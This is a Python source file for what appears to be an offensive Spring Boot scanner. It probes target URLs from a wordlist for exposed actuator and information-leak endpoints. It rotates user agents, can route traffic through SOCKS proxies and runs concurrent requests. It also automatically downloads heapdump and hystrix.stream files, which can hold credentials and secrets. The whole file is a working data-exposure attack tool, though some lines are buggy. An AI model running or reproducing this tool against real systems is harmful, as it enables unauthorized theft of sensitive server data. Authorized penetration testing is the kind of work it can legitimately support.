#!/usr/bin/env python
# coding=utf-8
       ################
      #   AabyssZG   #
     #    Fkalis    #
    #    Caojian   #
   ################
import itertools
from aiohttp_socks import ProxyConnector
from inc import output, console
import requests, sys, random, json
from tqdm import tqdm
from termcolor import cprint
from time import sleep
import time
import asyncio
import aiohttp
from hashlib import md5
hashlist=[]
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]


async def async_url(urllist,proxies):
    tasks = []
    cprint(f"======开始对目标URL测试SpringBoot信息泄露端点======", "cyan")
    sleeps = input("\n是否要延时扫描 (默认0秒): ")
    if sleeps == "":
        sleeps = int("0")
    semaphore=input("\n请设置当前任务最大并发量 (默认为10): ")
    if semaphore == "":
        semaphore = int("10")
    semaphores = asyncio.Semaphore(semaphore)
    with open("Dir.txt", 'r') as web:
        webs = web.readlines()
        for dir in webs:
            dir = dir.strip()
            u = urllist + dir
            task = asyncio.create_task(url(u, sleeps,semaphores,proxies))
            tasks.append(task)
            print(u)
        await asyncio.gather(*tasks)
        sys.exit()

async def url(u,sleeps,semaphore,proxies):
    f1 = open("urlout.txt", "wb+")
    f1.close()
    header = {"User-Agent": random.choice(ua)}
    try:
        if proxies == "":
            async with semaphore:
                async with aiohttp.ClientSession(headers=header) as session:
                    async with session.get(u, timeout=6,ssl=False) as r:
                        res= await r.text()
                        cprint(res)
                        status_code =r.status
                        sleep(int(float(sleeps)))
                        hashlist.append(md5(res.encode(encoding="utf-8")).hexdigest())
        else:
            async with semaphore:
                conn = ProxyConnector.from_url(proxies)
                async with aiohttp.ClientSession(headers=header,connector=conn) as session:
                    async with session.get(u, timeout=6,ssl=False) as r:
                        res= await r.text()
                        # cprint(res)
                        cprint(f"当前代理IP为{proxies}","green")
                        status_code =r.status
                        sleep(int(float(sleeps)))
                        hashlist.append(md5(res.encode(encoding="utf-8")).hexdigest())
        if status_code == 503:
            sys.exit()
        if ((status_code == 200) and ('need login' not in res) and ('禁止访问' not in res and (len(res) != 3318) and ('无访问权限' not in res) and ('认证失败' not in r.text))):
            cprint("[+] 状态码%d" % status_code+ ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.t)),"red")
            if md5(res.encode(encoding="utf-8")).hexdigest() not in hashlist:
                f2 = open("urlout.txt", "a")
                f2.write(u + '\n')
                f2.close()
            else:
                pass
                cprint(f"[-] 发现页面返回值重复的URL为 {u}", "yellow")
        elif(status_code == 200):
            cprint("[+] 状态码%d" % status_code + ' ' + "但无法获取信息 URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)),"magenta")
        else:
            cprint("[-] 状态码%d" % status_code  + ' ' + "无法访问URL为:" + u ,"yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        cprint(f"[-] URL为{u}的任务访问错误，错误代码为{e}，予以跳过！", "magenta")
    count = len(open("urlout.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标URL存在SpringBoot敏感信息泄露，已经导出至 urlout.txt ，共%d行记录" % count,"red")

def get_file(filename):
    with open(filename, 'r') as temp:
        temps = temp.readlines()
        for urls in temps:
            url = urls.strip()
            yield url

async def async_dir(url, proxies, semaphore, sleeps):
    try:
        tasks = []
        u_list = []
        with open("Dir.txt", 'r') as web:
            web_lines = web.readlines()
            for web_line in web_lines:
                web_line = web_line.strip()
                if ('://' not in url):
                    url = str("http://") + str(url)
                if str(url[-1]) != "/":
                    u = url + "/" + web_line
                else:
                    u = url + web_line
                u_list.append(u)
        tasks = [asyncio.create_task(file_semaphore(u_dir, proxies, semaphore, sleeps)) for u_dir in u_list]
        result = await asyncio.gather(*tasks)
    except Exception as e:
        for task in tasks:
            if not task.cancelled():
                task.cancel()
        cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

async def file(u, proxies):
    header = {"User-Agent": random.choice(ua)}
    async with aiohttp.ClientSession() as session:
        async with session.get(url=u, headers=header, proxy=proxies, timeout=6, allow_redirects=False, ssl=False) as r:
            conntext = await r.text()
            if ((r.status == 200) and ('need login' not in conntext) and ('禁止访问' not in conntext) and (len(conntext) != 3318) and ('无访问权限' not in conntext) and ('认证失败' not in conntext)):
                cprint("[+] 状态码%d" % r.status + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(conntext)), "red")
                f2 = open("output.txt", "a")
                f2.write(u + '\n')
                f2.close()
            elif r.status == 200:
                cprint(
                    "[+] 状态码%d" % r.status + ' ' + "但无法获取信息 URL为:" + u + '    ' + "页面长度为:" + str(len(conntext)), "magenta")
            else:
                cprint("[-] 状态码%d" % r.status + ' ' + "无法访问URL为:" + u, "yellow")

async def file_semaphore(url, proxies, semaphore, sleeps):
    async with semaphore:
        output = await file(url, proxies)
        await asyncio.sleep(int(sleeps))  # 等待4秒

async def file_main(urlfile, proxies):
    urls_lists = []
    f1 = open("output.txt", "wb+")
    f1.close()
    cprint("======开始读取目标TXT并测试SpringBoot信息泄露端点======", "cyan")
    time_start = time.time()
    sleeps = input("\n是否要延时扫描 (默认不延时，必须是整数): ")
    if sleeps == "":
        sleeps = "0"
    else:
        sleeps = int(sleeps)
    max_concurrency = input("请输入最大并发数 (默认10): ")
    if max_concurrency == "":
        max_concurrency = 10
    else:
        max_concurrency = int(max_concurrency)
    max_tasks = 100
    semaphore = asyncio.Semaphore(max_concurrency)
    urls_itr = get_file(urlfile)
    while True:
        try:
            urls_lists = list(itertools.islice(urls_itr, max_tasks))
            if not urls_lists:  # 当urls_itr为空时，直接跳出循环
                break
            tasks = [async_dir(url, proxies, semaphore, sleeps) for url in urls_lists]
            await asyncio.gather(*tasks)
        except StopIteration:
            break
    count = len(open("output.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标TXT内存在SpringBoot敏感信息泄露，已经导出至 output.txt ，共%d行记录" % count, "red")
    else:
        print('\n')
        cprint("[-] 目标TXT内没有存在SpringBoot敏感信息泄露", "yellow")
    time_end = time.time()  # 记录结束时间
    time_sum = time_end - time_start  # 计算的时间差为程序的执行时间，单位为秒/s
    cprint("[+] 批量扫描共耗时 %s 秒" % time_sum, "red")
    sys.exit()

def dump(urllist, proxies):
    def download(url: str, fname: str, proxies: str, newheader):
        # 用流stream的方式获取url的数据
        requests.packages.urllib3.disable_warnings()
        resp = requests.get(url, headers=newheader, timeout=6, stream=True, verify=False, proxies=proxies)
        # 拿到文件的长度，并把total初始化为0
        total = int(resp.headers.get('content-length', 0))
        # 打开当前目录的fname文件(名字你来传入)
        # 初始化tqdm，传入总数，文件名等数据，接着就是写入，更新等操作了
        with open(fname, 'wb') as file, tqdm(
                desc=fname,
                total=total,
                unit='iB',
                unit_scale=True,
                unit_divisor=1024,
        ) as bar:
            for data in resp.iter_content(chunk_size=1024):
                size = file.write(data)
                bar.update(size)

    cprint("======开始对目标URL测试SpringBoot敏感文件泄露并下载======", "cyan")
    # 下载文件，并传入文件名
    url1 = urllist + "actuator/heapdump"
    url2 = urllist + "heapdump"
    url3 = urllist + "heapdump.json"
    url4 = urllist + "gateway/actuator/heapdump"
    url5 = urllist + "hystrix.stream"
    url6 = urllist + "artemis-portal/artemis/heapdump"
    header = {"User-Agent": random.choice(ua)}

    try:
        if str(requests.head(url1)) != "<Response [200]>":
            cprint("[-] 在 /actuator/heapdump 未发现heapdump敏感文件泄露", "yellow")
        else:
            url = url1
            cprint("[+][+][+] 发现 /actuator/heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url, "red")
            download(url, "heapdump", proxies, header)
            sys.exit()
        if str(requests.head(url2)) != "<Response [200]>":
            cprint("[-] 在 /heapdump 未发现heapdump敏感文件泄露", "yellow")
        else:
            url = url2
            cprint("[+][+][+] 发现 /heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url, "red")
            download(url, "heapdump", proxies, header)
            sys.exit()
        if str(requests.head(url3)) != "<Response [200]>":
            cprint("[-] 在 /heapdump.json 未发现heapdump敏感文件泄露", "yellow")
        else:
            url = url3
            cprint("[+][+][+] 发现 /heapdump.json 敏感文件泄露" + ' ' + "下载端点URL为:" + url, "red")
            download(url, "heapdump.json", proxies, header)
            sys.exit()
        if str(requests.head(url4)) != "<Response [200]>":
            cprint("[-] 在 /gateway/actuator/heapdump 未发现heapdump敏感文件泄露", "yellow")
        else:
            url = url4
            cprint("[+][+][+] 发现 /gateway/actuator/heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url, "red")
            download(url, "heapdump", proxies, header)
            sys.exit()
        if str(requests.head(url5)) != ("<Response [401]>" or "<Response [200]>"):
            cprint("[-] 在 /hystrix.stream 未发现hystrix监控数据文件泄露，请手动验证", "yellow")
        else:
            url = url5
            cprint("[+][+][+] 发现 /hystrix.stream 监控数据文件泄露" + ' ' + "下载端点URL为:" + url, "red")
            download(url, "hystrix.stream", proxies, header)
            sys.exit()
        if str(requests.head(url6)) != "<Response [200]>":
            cprint("[-] 在 /artemis-portal/artemis/heapdump 未发现heapdump监控数据文件泄露，请手动验证", "yellow")
        else:
            url = url6
            cprint("[+][+][+] 发现 /artemis-portal/artemis/heapdump 监控数据文件泄露" + ' ' + "下载端点URL为:" + url,
                   "red")
            download(url, "heapdump", proxies, header)
            sys.exit()
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 下载失败，请手动尝试下载")
        sys.exit()
